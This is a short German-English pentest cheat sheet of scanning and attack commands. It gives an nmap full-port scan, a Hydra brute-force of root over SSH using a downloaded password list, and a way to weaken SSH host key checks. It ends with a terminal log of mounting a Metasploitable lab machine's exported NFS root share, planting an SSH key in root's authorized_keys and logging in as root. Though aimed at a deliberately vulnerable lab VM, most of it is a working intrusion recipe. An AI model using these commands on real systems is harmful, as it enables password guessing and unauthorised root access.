# Scans

### Adress-Scan im lokalen Netzwerk
$> arp-scan --interface=eth0 --localnet

### PortScan
$> nmap -p0-65535 192.168.x.x

### Hydra mit PasswordLists

hydra -l root -V -e nsr -t 4 -P top-10000.txt 192.168.x.x ssh

# Sonstiges

### Getting a list of most commen passwords
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/xato-net-10-million-passwords-10000.txt

### veraltete Signatur-Algorithmen akzeptieren
vi /etc/ssh/ssh_config
HostKeyAlgorithms +ssh-rsa,ssh-dss

### rlogin

TCP ports 512, 513, and 514 are known as "r" services, and have been misconfigured to allow remote access from any host (a standard ".rhosts + +" situation)

### NFS
NFS can be identified by probing port 2049 directly or asking the portmapper for a list of services.
**rpcinfo -p** to identify NFS and **showmount -e** to determine that the "/" share (the root of the file system) 

root@ubuntu:~# ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
                       
root@ubuntu:~# mkdir /tmp/r00t
root@ubuntu:~# mount -t nfs 192.168.99.131:/ /tmp/r00t/
root@ubuntu:~# cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
root@ubuntu:~# umount /tmp/r00t
                       
root@ubuntu:~# ssh root@192.168.99.131
Last login: Fri Jun  1 00:29:33 2012 from 192.168.99.128
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
                       
root@metasploitable:~#

